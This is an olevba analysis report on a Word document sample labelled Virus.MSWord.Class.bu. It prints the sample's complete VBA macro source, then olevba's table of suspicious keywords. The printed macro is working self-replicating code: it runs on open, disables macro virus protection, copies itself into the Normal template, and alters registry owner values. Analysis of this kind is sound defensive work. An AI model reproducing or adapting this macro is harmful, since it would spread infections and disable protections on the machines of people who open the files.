olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bu-6cd84ea40c941aa52c2d743fbf2aac929c374c1f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bu-6cd84ea40c941aa52c2d743fbf2aac929c374c1f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Tester2/23/01 3:55:59 PMtest
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Tester2/23/01 3:55:59 PMtest
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Tester2/23/01 3:55:59 PMtest
Const REG_SZ As Long = 1
'Tester2/23/01 3:55:59 PMtest
Const HKEY_CURRENT_USER As Long = &H80000001
'Tester2/23/01 3:55:59 PMtest
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Tester2/23/01 3:55:59 PMtest
Sub AutoOpen()
'Tester2/23/01 3:55:59 PMtest
On Error GoTo out
'Tester2/23/01 3:55:59 PMtest
Options.VirusProtection = False
'Tester2/23/01 3:55:59 PMtest
Options.SaveNormalPrompt = False
'Tester2/23/01 3:55:59 PMtest
Options.ConfirmConversions = False
'Tester2/23/01 3:55:59 PMtest
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tester2/23/01 3:55:59 PMtest
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tester2/23/01 3:55:59 PMtest
If nt > 70 And ad > 0 Then GoTo out
'Tester2/23/01 3:55:59 PMtest
If nt < 70 Then
'Tester2/23/01 3:55:59 PMtest
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Tester2/23/01 3:55:59 PMtest
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Tester2/23/01 3:55:59 PMtest
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Tester2/23/01 3:55:59 PMtest
End If
'Tester2/23/01 3:55:59 PMtest
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Tester2/23/01 3:55:59 PMtest

'Tester2/23/01 3:55:59 PMtest
host.codemodule.AddFromFile ("c:\class.sys")
'Tester2/23/01 3:55:59 PMtest
With host.codemodule
'Tester2/23/01 3:55:59 PMtest
    For x = 1 To 16
'Tester2/23/01 3:55:59 PMtest
    .deletelines 1
'Tester2/23/01 3:55:59 PMtest
    Next x
'Tester2/23/01 3:55:59 PMtest
End With
'Tester2/23/01 3:55:59 PMtest
If nt < 70 Then
'Tester2/23/01 3:55:59 PMtest
    With host.codemodule
'Tester2/23/01 3:55:59 PMtest
    .replaceline 1, "Sub AutoClose()"
'Tester2/23/01 3:55:59 PMtest
    .replaceline 91, "Sub ToolsMacro()"
'Tester2/23/01 3:55:59 PMtest
    For x = 70 To 81
'Tester2/23/01 3:55:59 PMtest
        .deletelines 62
'Tester2/23/01 3:55:59 PMtest
    Next x
'Tester2/23/01 3:55:59 PMtest
    .replaceline 35, "    For x = 1 To 4"
'Tester2/23/01 3:55:59 PMtest
    End With
'Tester2/23/01 3:55:59 PMtest
End If
'Tester2/23/01 3:55:59 PMtest
If nt < 70 Then
'Tester2/23/01 3:55:59 PMtest
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Tester2/23/01 3:55:59 PMtest
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Tester2/23/01 3:55:59 PMtest
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Tester2/23/01 3:55:59 PMtest
u = RegCloseKey(k)
'Tester2/23/01 3:55:59 PMtest
End If
'Tester2/23/01 3:55:59 PMtest
With host.codemodule
'Tester2/23/01 3:55:59 PMtest
    For x = 2 To 104 Step 2
'Tester2/23/01 3:55:59 PMtest
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Tester2/23/01 3:55:59 PMtest
    Next x
'Tester2/23/01 3:55:59 PMtest
End With
'Tester2/23/01 3:55:59 PMtest
out:
'Tester2/23/01 3:55:59 PMtest
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Tester2/23/01 3:55:59 PMtest
End Sub
'Tester2/23/01 3:55:59 PMtest
Sub ViewVBCode()
'Tester2/23/01 3:55:59 PMtest
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

